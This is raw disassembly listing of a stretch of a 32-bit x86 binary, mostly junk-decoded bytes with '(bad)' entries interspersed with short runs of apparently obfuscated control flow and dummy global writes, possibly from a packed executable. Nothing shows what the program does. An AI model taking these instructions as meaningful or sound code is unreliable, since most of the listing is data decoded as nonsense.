  40a531:	or     edi,DWORD PTR [edi-0x7f]
  40a534:	sbb    DWORD PTR [esi+0x0],0xc6253f1d
  40a53b:	in     al,0x7e
  40a53d:	ret    0x9262
  40a540:	pop    es
  40a541:	xchg   esi,eax
  40a542:	call   DWORD PTR [esi]
  40a544:	pop    DWORD PTR [eax]
  40a546:	outs   dx,BYTE PTR ds:[esi]
  40a547:	mul    BYTE PTR [ecx]
  40a549:	xchg   esp,eax
  40a54a:	jo     0x40a509
  40a54c:	outs   dx,BYTE PTR ds:[esi]
  40a54d:	dec    ebp
  40a54e:	nop
  40a54f:	mov    DWORD PTR ds:0x71712dd0,edx
  40a555:	mov    ch,0x5c
  40a557:	(bad)  
  40a558:	cmp    ebp,edx
  40a55a:	lahf   
  40a55b:	cwde   
  40a55c:	pop    esp
  40a55d:	and    ah,BYTE PTR [eax]
  40a55f:	rcr    BYTE PTR [ebx-0x2a785335],1
  40a565:	jae    0x40a587
  40a567:	popf   
  40a568:	out    dx,eax
  40a569:	sub    DWORD PTR [ebx],ebp
  40a56b:	sbb    eax,0xc8a6f8c7
  40a570:	sbb    al,0xfc
  40a572:	xchg   ecx,eax
  40a573:	xchg   esi,eax
  40a574:	mov    ah,0x19
  40a576:	sub    al,0x13
  40a578:	lahf   
  40a579:	cmc    
  40a57a:	icebp  
  40a57b:	mov    DWORD PTR [ebp-0x1b5396db],esi
  40a581:	inc    ecx
  40a582:	sbb    al,0xf9
  40a584:	jmp    0xda00:0x9ceb0cd1
  40a58b:	push   esi
  40a58c:	mov    ds:0xee75e1f2,al
  40a591:	mov    edx,0xf1cba43c
  40a596:	sti    
  40a597:	and    ebx,ebx
  40a599:	jns    0x40a5eb
  40a59b:	js     0x40a585
  40a59d:	mov    ecx,0xa3235003
  40a5a2:	test   DWORD PTR [eax-0x3adc51b],ebp
  40a5a8:	and    BYTE PTR [edi-0x59283167],dh
  40a5ae:	xchg   BYTE PTR [esi+0x3504a61],cl
  40a5b4:	and    BYTE PTR [ebp+0xee5fe18],ah
  40a5ba:	sub    cl,ah
  40a5bc:	stos   DWORD PTR es:[edi],eax
  40a5bd:	ret    
  40a5be:	dec    edi
  40a5bf:	jb     0x40a594
  40a5c1:	or     bl,BYTE PTR ds:0x5e40da6a
  40a5c7:	(bad)  
  40a5c9:	xor    DWORD PTR [ebx],eax
  40a5cb:	lods   al,BYTE PTR ds:[esi]
  40a5cc:	clc    
  40a5cd:	push   edi
  40a5ce:	adc    DWORD PTR [ebx],eax
  40a5d0:	ins    BYTE PTR es:[edi],dx
  40a5d1:	(bad)  
  40a5d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5d3:	pop    ebp
  40a5d4:	xor    eax,0xf1993139
  40a5d9:	lea    ebx,[ebx-0x3ef52212]
  40a5df:	or     bh,dh
  40a5e1:	leave  
  40a5e2:	loopne 0x40a5b3
  40a5e4:	xor    bh,BYTE PTR [edi-0x61]
  40a5e7:	sbb    BYTE PTR [ebp+0x50],0x34
  40a5eb:	int    0xa3
  40a5ed:	and    ebx,DWORD PTR [edx+0x48075d98]
  40a5f3:	call   0x1ca8:0x2803f776
  40a5fa:	loop   0x40a620
  40a5fc:	xchg   esp,eax
  40a5fd:	sti    
  40a5fe:	les    esi,FWORD PTR [ecx-0xf]
  40a601:	dec    edi
  40a602:	enter  0x5546,0x45
  40a606:	js     0x40a58c
  40a608:	ret    0xcdca
  40a60b:	cwde   
  40a60c:	(bad)  
  40a60d:	fcmovb st,st(6)
  40a60f:	mov    al,0xf5
  40a611:	and    bh,0x1d
  40a614:	(bad)  
  40a615:	mov    esp,0xce247bd4
  40a61a:	mov    ebx,0x650cc967
  40a61f:	retf   0x6636
  40a622:	adc    edi,edi
  40a624:	lods   al,BYTE PTR ds:[esi]
  40a625:	fnstsw WORD PTR [eax-0x7bd6a5b2]
  40a62b:	adc    DWORD PTR [edx-0x7d],esp
  40a62e:	sub    eax,0x6fcc569d
  40a633:	or     BYTE PTR [ebx-0x1403c6f],dh
  40a639:	cmp    BYTE PTR [ebx-0x4df314f4],dl
  40a63f:	pusha  
  40a640:	repnz mov ah,0x2f
  40a643:	mov    gs,WORD PTR [edx-0x1b]
  40a646:	daa    
  40a647:	mov    ds:0x5cdcd3cd,al
  40a64c:	jae    0x40a692
  40a64e:	cdq    
  40a64f:	sub    al,0xb2
  40a651:	xor    edx,edx
  40a653:	(bad)  
  40a654:	shl    BYTE PTR [esi+0x3a],1
  40a657:	aaa    
  40a658:	or     DWORD PTR [edi-0x4d],esp
  40a65b:	dec    ebp
  40a65c:	adc    eax,0xdce5420a
  40a661:	push   edi
  40a662:	iret   
  40a663:	jbe    0x40a634
  40a665:	popf   
  40a666:	sbb    BYTE PTR [edx],bl
  40a668:	fdiv   DWORD PTR [esi+0x76]
  40a66b:	ss gs das 
  40a66e:	inc    esi
  40a66f:	lds    edx,FWORD PTR ds:0xa6be2f2c
  40a675:	and    BYTE PTR [ecx+0x2a],ch
  40a678:	or     dl,BYTE PTR [esp+ebp*8]
  40a67b:	arpl   WORD PTR [esi],si
  40a67d:	add    esi,DWORD PTR [ebp-0x71]
  40a680:	aad    0xfb
  40a682:	mov    bl,bh
  40a684:	jb     0x40a66e
  40a686:	test   BYTE PTR [ebp+0xd367e6f],0x26
  40a68d:	mov    eax,ds:0x12fec61e
  40a692:	mov    ebx,cs
  40a694:	dec    edx
  40a695:	mov    dl,0xf9
  40a697:	xor    bh,BYTE PTR [edx-0x57]
  40a69a:	in     eax,dx
  40a69b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a69c:	scas   al,BYTE PTR es:[edi]
  40a69d:	mov    ah,0xc5
  40a69f:	outs   dx,BYTE PTR ds:[esi]
  40a6a0:	mov    ecx,DWORD PTR [esi+0x39]
  40a6a3:	not    BYTE PTR [esi+0x1e]
  40a6a6:	rol    DWORD PTR [edx+0x32b8f921],cl
  40a6ac:	rol    BYTE PTR [edx],0x7d
  40a6af:	out    dx,eax
  40a6b0:	and    DWORD PTR [ebp+0x6c],ebp
  40a6b3:	ja     0x40a71e
  40a6b5:	jbe    0x40a652
  40a6b7:	fcmovu st,st(5)
  40a6b9:	outs   dx,BYTE PTR ds:[esi]
  40a6ba:	mov    esp,0x94753635
  40a6bf:	data16 jae 0x40a725
  40a6c2:	das    
  40a6c3:	repz jp 0x40a716
  40a6c6:	fs pop es
  40a6c8:	lods   al,BYTE PTR ds:[esi]
  40a6c9:	pop    esp
  40a6ca:	cli    
  40a6cb:	dec    esp
  40a6cc:	sbb    eax,0x1aaa992b
  40a6d1:	mov    al,BYTE PTR [eax+0x4e]
  40a6d4:	adc    esp,DWORD PTR [ebp-0x29]
  40a6d7:	test   DWORD PTR [esp+esi*2+0x5f],edi
  40a6db:	lahf   
  40a6dc:	rcl    BYTE PTR [ecx+eiz*8+0x57],1
  40a6e0:	jmp    0xd39ff1c2
  40a6e5:	imul   ebx,DWORD PTR [edx+0x7c6b20f],0x37
  40a6ec:	and    edi,DWORD PTR [ebx]
  40a6ee:	clc    
  40a6ef:	mov    DWORD PTR ds:0x43376b,0x5aa8
  40a6f9:	jne    0x40b4e6
  40a6ff:	adc    DWORD PTR ds:0x433757,0xbfa
  40a709:	push   DWORD PTR [ebp+0x8]
  40a70c:	add    DWORD PTR ds:0x4337e7,0x7522
  40a716:	call   0x4115fc
  40a71b:	sbb    ecx,0x1aca
  40a721:	mov    DWORD PTR [ebp-0x20],eax
  40a724:	mov    eax,DWORD PTR [ebp-0x4]
  40a727:	xor    esi,esi
  40a729:	xor    esi,DWORD PTR ds:0x433817
  40a72f:	or     DWORD PTR ds:0x433823,esi
  40a735:	mov    ecx,DWORD PTR [ebp-0x20]
  40a738:	mov    esi,0x7510854
  40a73d:	xor    eax,esi
  40a73f:	add    DWORD PTR ds:0x433813,0x433707
  40a749:	add    eax,ebx
  40a74b:	mov    DWORD PTR ds:0x4337af,0x4f05
  40a755:	cmp    ecx,eax
  40a757:	mov    DWORD PTR ds:0x433767,0x525
  40a761:	je     0x40b9ed
  40a767:	add    DWORD PTR ds:0x4337ef,0x3590
  40a771:	push   DWORD PTR [ebp-0x20]
  40a774:	xor    DWORD PTR ds:0x4336ff,0x1906
  40a77e:	push   DWORD PTR [ebp+0x8]
  40a781:	dec    DWORD PTR ds:0x4337db
  40a787:	call   0x40eac8
  40a78c:	movzx  ecx,WORD PTR ds:0x43370b
  40a793:	sub    DWORD PTR ds:0x433723,ecx
  40a799:	jmp    0x40a9fc
  40a79e:	or     al,0xd4
  40a7a0:	and    ah,bl
  40a7a2:	loopne 0x40a78c
  40a7a4:	shl    ah,1
  40a7a6:	sti    
  40a7a7:	and    eax,0x2bfcec0c
  40a7ac:	stos   DWORD PTR es:[edi],eax
  40a7ad:	scas   al,BYTE PTR es:[edi]
  40a7ae:	push   ss
  40a7af:	in     eax,dx
  40a7b0:	jle    0x40a830
  40a7b2:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a7b6:	xchg   BYTE PTR [esi+0x45],ah
  40a7b9:	ss out 0x61,al
  40a7bc:	ins    BYTE PTR es:[edi],dx
  40a7bd:	ret    
  40a7be:	jg     0x40a74a
  40a7c0:	retf   
  40a7c1:	sti    
  40a7c2:	into   
  40a7c3:	adc    eax,0x65c0bab9
  40a7c8:	repnz mov WORD PTR [esi],?
  40a7cb:	cmp    DWORD PTR ds:0x53a0a680,ebp
  40a7d1:	outs   dx,DWORD PTR ds:[esi]
  40a7d2:	outs   dx,DWORD PTR ds:[esi]
  40a7d3:	inc    esp
  40a7d4:	or     al,0x29
  40a7d6:	call   0xe423:0xa7a75fc0
  40a7dd:	lods   eax,DWORD PTR ds:[esi]
  40a7de:	sub    ecx,DWORD PTR [ecx-0x2a30b959]
  40a7e4:	stos   DWORD PTR es:[edi],eax
  40a7e5:	adc    WORD PTR [ecx],cx
  40a7e8:	mov    ebp,esi
  40a7ea:	and    edi,DWORD PTR [eax-0x12]
  40a7ed:	xor    BYTE PTR [edi+ecx*4-0x72f6c46a],al
  40a7f4:	(bad)  [esi-0x6b3d8812]
  40a7fa:	fadd   DWORD PTR [ebx]
  40a7fc:	sub    bh,cl
  40a7fe:	mov    bh,0xa1
  40a800:	cmp    BYTE PTR [ecx-0x22],0x6b
  40a804:	push   ecx
  40a805:	xchg   edx,eax
  40a806:	dec    eax
  40a807:	in     al,0x6d
  40a809:	pop    eax
  40a80a:	jl     0x40a797
  40a80c:	rol    BYTE PTR [eax],1
  40a80e:	push   ebx
  40a80f:	test   BYTE PTR [esi+0xaf10f26],al
  40a815:	test   al,0x68
  40a817:	mov    esi,0x63c5e723
  40a81c:	or     BYTE PTR [edi+0x15],0x5e
  40a820:	daa    
  40a821:	stos   BYTE PTR es:[edi],al
  40a822:	sub    esp,ebx
  40a824:	xchg   esp,eax
  40a825:	adc    al,0x76
  40a827:	jecxz  0x40a7ce
  40a829:	adc    edi,DWORD PTR [edx]
  40a82b:	adc    ebx,ecx
  40a82d:	dec    eax
  40a82e:	cmp    ch,BYTE PTR [esi+eax*8]
  40a831:	icebp  
  40a832:	push   eax
  40a833:	or     esi,DWORD PTR [ecx]
  40a835:	cli    
  40a836:	xor    al,BYTE PTR [esi]
  40a838:	pop    ds
  40a839:	in     al,0xa6
  40a83b:	mov    ah,0x7b
  40a83d:	jb     0x40a858
  40a83f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a840:	push   es
  40a841:	fbld   TBYTE PTR [edx]
  40a843:	jnp    0x40a844
  40a845:	xchg   ebx,eax
  40a846:	call   0xfae46978
  40a84b:	scas   eax,DWORD PTR es:[edi]
  40a84c:	cdq    
  40a84d:	iret   
  40a84e:	cs loop 0x40a85e
  40a851:	pop    esi
  40a852:	mov    ds:0x6ace9ca,al
  40a857:	in     al,dx
  40a858:	pop    eax
  40a859:	xor    eax,0x32b4892
  40a85e:	neg    al
  40a860:	xchg   edi,eax
  40a861:	dec    edi
  40a862:	sbb    eax,0xc33c13dd
  40a867:	dec    eax
  40a868:	(bad)  
  40a869:	pop    es
  40a86a:	lds    esp,FWORD PTR [esi-0x62]
  40a86d:	and    cl,ch
  40a86f:	and    ecx,ecx
  40a871:	dec    si
  40a873:	sub    DWORD PTR [esi+0x52],edi
  40a876:	fcomp  st(7)
  40a878:	xchg   esp,eax
  40a879:	mov    ds:0x8f24fd29,al
  40a87e:	cs inc edx
  40a880:	hlt    
  40a881:	lods   eax,DWORD PTR ds:[esi]
  40a882:	loopne 0x40a866
  40a884:	(bad)  
  40a885:	call   FWORD PTR [eax+0x57]
  40a888:	mov    edi,0x759ce143
  40a88d:	jg     0x40a84f
  40a88f:	stos   DWORD PTR es:[edi],eax
  40a890:	pop    ss
  40a891:	cld    
  40a892:	daa    
  40a893:	mov    al,ds:0x8fa540ac
  40a898:	adc    al,0x2e
  40a89a:	jnp    0x40a8ac
  40a89c:	add    BYTE PTR [edx+eax*4],bh
  40a89f:	es pusha 
  40a8a1:	in     eax,dx
  40a8a2:	cmp    eax,DWORD PTR [esi-0x40]
  40a8a5:	push   ss
  40a8a6:	or     eax,0xc4144dc9
  40a8ab:	push   ecx
  40a8ac:	pushf  
  40a8ad:	inc    ecx
  40a8ae:	daa    
  40a8af:	aas    
  40a8b0:	jns    0x40a8dc
  40a8b2:	ss mov bh,0xc9
  40a8b5:	das    
  40a8b6:	test   DWORD PTR [ebp-0x3775a006],0x4b5e2da0
  40a8c0:	sub    ch,BYTE PTR [eax]
  40a8c2:	lea    esp,[eax]
  40a8c4:	fadd   QWORD PTR [ebp+eax*4-0x6b]
  40a8c8:	dec    esp
  40a8c9:	ss dec ebp
  40a8cb:	jne    0x40a8c6
  40a8cd:	pop    ecx
  40a8ce:	lea    esp,[ecx+0x5b23041e]
  40a8d4:	aas    
  40a8d5:	stc    
  40a8d6:	or     al,0xaa
  40a8d8:	mov    ebp,?
  40a8da:	and    al,0x8c
  40a8dc:	pop    ds
  40a8dd:	(bad)  
  40a8de:	mov    edi,0x3d8628b9
  40a8e4:	xchg   BYTE PTR [eax+0x77],cl
  40a8e7:	inc    esp
  40a8e8:	xor    al,0x64
  40a8ea:	mov    fs,eax
  40a8ec:	push   0x73566d19
  40a8f1:	xor    al,0xbd
  40a8f3:	jmp    DWORD PTR [eax]
  40a8f5:	pop    edx
  40a8f6:	pop    esp
  40a8f7:	fcomp  st(3)
  40a8f9:	push   cs
  40a8fa:	jg     0x40a8c6
  40a8fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8fe:	jle    0x40a914
  40a900:	xchg   ebx,eax
  40a901:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a902:	add    ecx,DWORD PTR [esi]
  40a904:	int    0x7c
  40a906:	push   eax
  40a907:	lods   eax,DWORD PTR ds:[esi]
  40a908:	jp     0x40a8f8
  40a90a:	dec    edx
  40a90b:	xchg   esp,eax
  40a90c:	mov    al,0xe2
  40a90e:	in     al,dx
  40a90f:	fs inc edi
  40a911:	jo     0x40a8aa
  40a913:	pusha  
  40a914:	mov    ebx,DWORD PTR [ebx-0xfe41544]
  40a91a:	xor    al,0x4a
  40a91c:	push   cs
  40a91d:	jno    0x40a957
  40a91f:	(bad)  
  40a921:	adc    dl,BYTE PTR [edx]
  40a923:	lods   eax,DWORD PTR ds:[esi]
  40a924:	hlt    
  40a925:	mov    ebp,0x79bb443f
  40a92a:	or     BYTE PTR [ebx+0x74db5d38],al
  40a930:	stc    
  40a931:	aas    
  40a932:	fs lock jmp 0x40a921
  40a936:	add    eax,0x15022eab
  40a93b:	push   0xffffffad
  40a93d:	(bad)  
  40a93f:	jmp    0x40a8da
  40a941:	pop    ebx
  40a942:	jb     0x40a975
  40a944:	gs std 
  40a946:	or     DWORD PTR [esi+0x78],edx
  40a949:	(bad)  
  40a94a:	fsubr  QWORD PTR [ecx]
  40a94c:	outs   dx,BYTE PTR ds:[esi]
  40a94d:	js     0x40a91a
  40a94f:	fisubr WORD PTR [ecx]
  40a951:	adc    al,0xcd
  40a953:	das    
  40a954:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a955:	test   eax,0x2eff9d8f
  40a95a:	gs or  eax,0x5bd559e2
  40a960:	pop    ebp
  40a961:	call   FWORD PTR [ecx+0x5295b6ce]
  40a967:	(bad)  
  40a968:	or     esp,DWORD PTR [edi-0x339e718d]
  40a96e:	(bad)  
  40a96f:	and    eax,DWORD PTR ds:0x6082f51e
  40a975:	stos   BYTE PTR es:[edi],al
  40a976:	aaa    
  40a977:	jl     0x40a960
  40a979:	fnsave [ebx]
  40a97b:	fwait
  40a97c:	aaa    
  40a97d:	and    ebp,edx
  40a97f:	fisttp DWORD PTR [edx-0x7cb1ef4]
  40a985:	retf   
  40a986:	adc    DWORD PTR [ebx+0x5465af90],ecx
  40a98c:	xlat   BYTE PTR ds:[ebx]
  40a98d:	mov    eax,ds:0x96d14eda
  40a992:	pop    edx
  40a993:	cld    
  40a994:	icebp  
  40a995:	pushf  
  40a996:	inc    ecx
  40a997:	rcl    DWORD PTR [edi-0x5ec61a6d],cl
  40a99d:	test   DWORD PTR [ebx],ecx
  40a99f:	les    ebx,FWORD PTR [ebx+0x7f]
  40a9a2:	test   dl,dl
  40a9a4:	mov    edx,0xe840061f
  40a9a9:	(bad)
  40a9ac:	or     BYTE PTR [ecx],ch
  40a9ae:	push   0x4df3e5ee
  40a9b3:	cmp    al,BYTE PTR [esi+0x3cd6f957]
  40a9b9:	repnz cdq 
  40a9bb:	sar    DWORD PTR ds:0x5e13abf8,cl
  40a9c1:	cdq    
  40a9c2:	mov    edi,0x6fa68272
  40a9c7:	mov    ebp,0x2e3f6078
  40a9cc:	push   edx
  40a9cd:	pushw  es
  40a9cf:	shl    bh,1
  40a9d1:	nop
  40a9d2:	adc    al,ch
  40a9d4:	push   0xf05873ad
  40a9d9:	aas    
  40a9da:	call   0x3ebf7124
  40a9df:	mov    esi,0x8f065b14
  40a9e4:	outs   dx,DWORD PTR ds:[esi]
  40a9e5:	(bad)  
  40a9e6:	addr16 in al,dx
  40a9e8:	hlt    
  40a9e9:	mov    ch,0x6b
  40a9eb:	mov    eax,0x2a39d96e
  40a9f0:	sbb    eax,ecx
  40a9f2:	mov    ebx,0xa8b86df0
  40a9f7:	enter  0x966c,0xde
  40a9fb:	xrelease mov DWORD PTR [ebp-0x14],eax
  40a9ff:	mov    eax,DWORD PTR [ebp-0x4]
  40aa02:	xor    DWORD PTR ds:0x433717,edi
  40aa08:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa0b:	xor    eax,esi
  40aa0d:	adc    DWORD PTR ds:0x433817,0x4337e7
  40aa17:	add    eax,ebx
  40aa19:	mov    DWORD PTR ds:0x433767,0x6600
  40aa23:	jmp    0x40ac86
  40aa28:	dec    ebp
  40aa29:	ret    
  40aa2a:	xchg   esp,eax
  40aa2b:	push   eax
  40aa2c:	nop
  40aa2d:	push   ecx
  40aa2e:	dec    ecx
  40aa2f:	ret    
  40aa30:	mov    esp,DWORD PTR es:[edx+eiz*2]
  40aa34:	inc    ecx
  40aa35:	inc    edx
  40aa36:	dec    ebp
  40aa37:	sub    edx,eax
  40aa39:	jmp    0x40aab9
  40aa3b:	jle    0x40aa75
  40aa3d:	jl     0x40aabd
  40aa3f:	jle    0x40aaae
  40aa41:	and    esi,DWORD PTR [edi-0x57]
  40aa44:	repz adc eax,0xe1e8afc4
  40aa4a:	iret   
  40aa4b:	outs   dx,DWORD PTR ds:[esi]
  40aa4c:	or     DWORD PTR [eax-0x47],0xffffffd4
  40aa50:	adc    al,0x85
  40aa52:	mov    ?,WORD PTR [eax]
  40aa54:	fild   QWORD PTR [ecx]
  40aa56:	sbb    esi,DWORD PTR [eax-0x1c]
  40aa59:	add    ecx,DWORD PTR ds:0x3849d16b
  40aa5f:	jnp    0x40aa09
  40aa61:	adc    ah,BYTE PTR [ebx+0x3cbf6960]
  40aa67:	xor    eax,edx
  40aa69:	imul   BYTE PTR [edi+0x7f]
  40aa6c:	xchg   ah,dh
  40aa6e:	inc    esp
  40aa6f:	cmp    al,0xfb
  40aa71:	neg    DWORD PTR [eax]
  40aa73:	les    esi,FWORD PTR [edx]
  40aa75:	jb     0x40aa03
  40aa77:	aad    0xa3
  40aa79:	dec    edx
  40aa7a:	enter  0x7c12,0x42
  40aa7e:	movmskps esp,xmm3
  40aa81:	nop
  40aa82:	pop    eax
  40aa83:	jp     0x40aa07
  40aa85:	jbe    0x40aaf7
  40aa87:	mov    ebp,0xa3d305ab
  40aa8c:	and    DWORD PTR [esi+0x67],ecx
  40aa8f:	stc    
  40aa90:	inc    ebx
  40aa91:	xchg   edx,eax
  40aa92:	fsubr  st(1),st
  40aa94:	call   DWORD PTR [edx+0x530a2a43]
  40aa9a:	xchg   edi,eax
  40aa9b:	stc    
  40aa9c:	add    ebx,DWORD PTR [esi+0x152bea73]
  40aaa2:	xor    dh,dl
  40aaa4:	lds    ebp,FWORD PTR [ebx-0x78]
  40aaa7:	idiv   BYTE PTR [eax]
  40aaa9:	jno    0x40aa7a
  40aaab:	pop    ss
  40aaac:	leave  
  40aaad:	test   eax,0x83feee0d
  40aab2:	rcl    BYTE PTR [edi+0x26],0xc5
  40aab6:	clc    
  40aab7:	(bad)  
  40aab9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aaba:	sub    BYTE PTR cs:[ebx-0x73],cl
  40aabe:	push   ebx
  40aabf:	mov    al,ds:0xd7225861
  40aac4:	stos   BYTE PTR es:[edi],al
  40aac5:	lock jp 0x40ab07
  40aac8:	es retf 0x41c3
  40aacc:	dec    eax
  40aacd:	and    DWORD PTR [ecx],ebx
  40aacf:	xor    edx,eax
  40aad1:	cmp    ebp,ebx
  40aad3:	clc    
  40aad4:	mov    dl,0xba
  40aad6:	and    esi,DWORD PTR ds:0xdd0a2e34
  40aadc:	sbb    eax,0x4713c23c
  40aae1:	aaa    
  40aae2:	sbb    esp,DWORD PTR [eax+0x79]
  40aae5:	aas    
  40aae6:	push   0x4435294d
  40aaeb:	mov    eax,0xf82df861
  40aaf0:	jge    0x40aada
  40aaf2:	stc    
  40aaf3:	fisub  WORD PTR [eax+0x58674754]
  40aaf9:	jecxz  0x40aab4
  40aafb:	inc    edi
  40aafc:	dec    edi
  40aafd:	les    esp,FWORD PTR ds:0x86217d6b
  40ab03:	ror    dl,cl
  40ab05:	adc    eax,0x30de60e
  40ab0a:	test   DWORD PTR [esi-0x63669400],ebx
  40ab10:	jp     0x40aa93
  40ab12:	test   al,0xe
  40ab14:	and    DWORD PTR [ebx+ebx*8+0x5f13d74a],esp
  40ab1b:	xchg   esp,eax
  40ab1c:	icebp  
  40ab1d:	push   edx
  40ab1e:	rcl    BYTE PTR [esi],0x46
  40ab21:	das    
  40ab22:	sub    bl,dh
  40ab24:	jecxz  0x40aab3
  40ab26:	loop   0x40ab84
  40ab28:	push   ecx
  40ab29:	jg     0x40aba0
  40ab2b:	or     DWORD PTR [eax],eax
  40ab2d:	fstp   DWORD PTR [ecx+0x4]
  40ab30:	dec    esi
  40ab31:	repz sub bl,BYTE PTR [eax-0x48ba134c]
  40ab38:	add    DWORD PTR [edi+0x6c],esp
  40ab3b:	or     al,BYTE PTR [edx+0x7e]
  40ab3e:	inc    ecx
  40ab3f:	jmp    0x30d0ac1d
  40ab44:	cld    
  40ab45:	xor    al,dl
  40ab47:	cdq    
  40ab48:	es mov al,0xac
  40ab4b:	mov    esi,0xdda39840
  40ab50:	push   ds
  40ab51:	push   esp
  40ab52:	inc    eax
  40ab53:	xchg   ebp,eax
  40ab54:	xchg   edx,eax
  40ab55:	popf   
  40ab56:	out    dx,eax
  40ab57:	mov    cs,WORD PTR [eax]
  40ab59:	jmp    0x40abcd
  40ab5b:	push   esi
  40ab5c:	ss adc ah,bl
  40ab5f:	fadd   st(0),st
  40ab61:	or     BYTE PTR [esi+0x5b],ch
  40ab64:	pushf  
  40ab65:	addr16 adc al,dh
  40ab68:	addr16 icebp 
  40ab6a:	pop    edx
  40ab6b:	xchg   ebp,eax
  40ab6c:	call   0x5bae:0xf13e05aa
  40ab73:	dec    edx
  40ab74:	jl     0x40ab7d
  40ab76:	xchg   edi,eax
  40ab77:	mov    esp,0x170d13d5
  40ab7c:	aam    0x82
  40ab7e:	jge    0x40ab9d
  40ab80:	xchg   ebx,eax
  40ab81:	(bad)  
  40ab82:	mov    ds:0x13385bef,eax
  40ab87:	nop
  40ab88:	xor    ah,BYTE PTR [ebx+0x60]
  40ab8b:	sub    al,0x18
  40ab8d:	call   0xdbb3:0x75749ed7
  40ab94:	mov    eax,ds:0x142d0282
  40ab99:	sar    BYTE PTR [ecx+ecx*1-0x37bf033e],0x52
  40aba1:	jno    0x40ab4a
  40aba3:	add    BYTE PTR ds:0xe7a4f773,0x73
  40abaa:	stos   DWORD PTR es:[edi],eax
  40abab:	aas    
  40abac:	xchg   BYTE PTR [esi+esi*2+0x4be02b40],al
  40abb3:	dec    edi
  40abb4:	or     al,0x37
  40abb6:	pop    ecx
  40abb7:	out    dx,al
  40abb8:	les    ebx,FWORD PTR [edi-0x6ebbf701]
  40abbe:	call   0xa3eb:0x7cf959a0
  40abc5:	stos   DWORD PTR es:[edi],eax
  40abc6:	ret    
  40abc7:	iret   
  40abc8:	and    esi,0x5f4dd174
  40abce:	ins    BYTE PTR es:[edi],dx
  40abcf:	out    dx,al
  40abd0:	adc    BYTE PTR [ebx-0x6d2481d],al
  40abd6:	test   DWORD PTR [ebx+0x19d4ed47],ebp
  40abdc:	lock push esi
  40abde:	adc    BYTE PTR ds:0x95d89b96,cl
  40abe4:	shl    BYTE PTR [edx-0xb],cl
  40abe7:	lea    esi,[ecx-0x28]
  40abea:	jo     0x40ac2d
  40abec:	or     BYTE PTR [edx+0x572fcc99],cl
  40abf2:	sub    al,0xc3
  40abf4:	xor    dl,bl
  40abf6:	je     0x40abe5
  40abf8:	xor    edi,DWORD PTR [ebp+0x22fddbd6]
  40abfe:	clc    
  40abff:	dec    esi
  40ac00:	xchg   ebp,eax
  40ac01:	hlt    
  40ac02:	es addr16 mov ebx,0xc4fe94a1
  40ac09:	ret    0x2aa8
  40ac0c:	push   es
  40ac0d:	fs mov bl,0xa
  40ac10:	xchg   esi,eax
  40ac11:	sar    BYTE PTR [eax+0xf2b7846],1
  40ac17:	lds    edx,FWORD PTR [eax-0x3fa0c134]
  40ac1d:	popa   
  40ac1e:	call   0xd8dc5f06
  40ac23:	cmp    dh,BYTE PTR [ebx]
  40ac25:	ins    DWORD PTR es:[edi],dx
  40ac26:	es sub al,0x22
  40ac29:	xchg   esi,eax
  40ac2a:	jno    0x40ac48
  40ac2c:	jae    0x40ac93
  40ac2e:	fs ds daa 
  40ac31:	cmp    al,0x65
  40ac33:	xor    edi,DWORD PTR [edx+0x3cc0450e]
  40ac39:	loop   0x40acb4
  40ac3b:	mov    eax,ds:0x2480e1e2
  40ac40:	mov    ?,WORD PTR [ebx-0x6c]
  40ac43:	sub    cl,dl
  40ac45:	jo     0x40ac20
  40ac47:	cld    
  40ac48:	leave  
  40ac49:	xchg   DWORD PTR [edx-0x1e],ebp
  40ac4c:	mov    ds:0x45c1791e,eax
  40ac51:	repnz arpl dx,dx
  40ac54:	addr16 popf 
  40ac56:	lods   al,BYTE PTR ds:[esi]
  40ac57:	stos   DWORD PTR es:[edi],eax
  40ac58:	jb     0x40ac34
  40ac5a:	outs   dx,DWORD PTR ds:[esi]
  40ac5b:	jge    0x40ac95
  40ac5d:	test   esi,esi
  40ac5f:	fcmovu st,st(2)
  40ac61:	shr    ebx,1
  40ac63:	or     ecx,DWORD PTR [edi+0x502b4cc]
  40ac69:	fild   WORD PTR [ebx+ebp*2-0x17]
  40ac6d:	int    0xbc
  40ac6f:	sub    DWORD PTR [edi+0x25b3b8ff],eax
  40ac75:	mov    BYTE PTR [ecx+0x60],bl
  40ac78:	stos   BYTE PTR es:[edi],al
  40ac79:	or     BYTE PTR ds:0x9414852e,dh
  40ac7f:	mov    ebp,0xe8bdd752
  40ac84:	inc    edi
  40ac85:	int    0x3b
  40ac87:	enter  0x840f,0x5f
  40ac8b:	or     eax,0x1d810000
  40ac90:	imul   esi,DWORD PTR [edi],0x43
  40ac93:	add    BYTE PTR [ebx],dl
  40ac95:	je     0x40ac97
  40ac97:	add    BYTE PTR [ebx+0x2581ec45],cl
  40ac9d:	out    dx,eax
  40ac9e:	aaa    
  40ac9f:	inc    ebx
  40aca0:	add    BYTE PTR [eax],al
  40aca2:	add    BYTE PTR [eax],al
  40aca4:	add    BYTE PTR [ebx],dh
  40aca6:	leave  
  40aca7:	or     ecx,DWORD PTR ds:0x4337ef
  40acad:	inc    ecx
  40acae:	mov    DWORD PTR ds:0x4337ef,ecx
  40acb4:	cmp    DWORD PTR ds:0x4337ef,0x6
  40acbb:	jne    0x40acdb
  40acc1:	push   0x433888
  40acc6:	push   0x4338cc
  40accb:	push   0x3fa4
  40acd0:	push   0x125d
  40acd5:	call   DWORD PTR ds:0x4120e4
  40acdb:	cmp    DWORD PTR ds:0x4337ef,0x5
  40ace2:	jne    0x40acf7
  40ace8:	xor    ecx,ecx
  40acea:	or     ecx,DWORD PTR ds:0x4337ef
  40acf0:	inc    ecx
  40acf1:	mov    DWORD PTR ds:0x4337ef,ecx
  40acf7:	cmp    DWORD PTR ds:0x4337ef,0x1a
  40acfe:	jb     0x40aca5
  40ad04:	adc    DWORD PTR ds:0x43379f,0xf8d
  40ad0e:	jmp    0x40af71
  40ad13:	stos   DWORD PTR es:[edi],eax
  40ad14:	adc    eax,0x70b1f693
  40ad19:	imul   edx,DWORD PTR [ecx+0x53],0x49
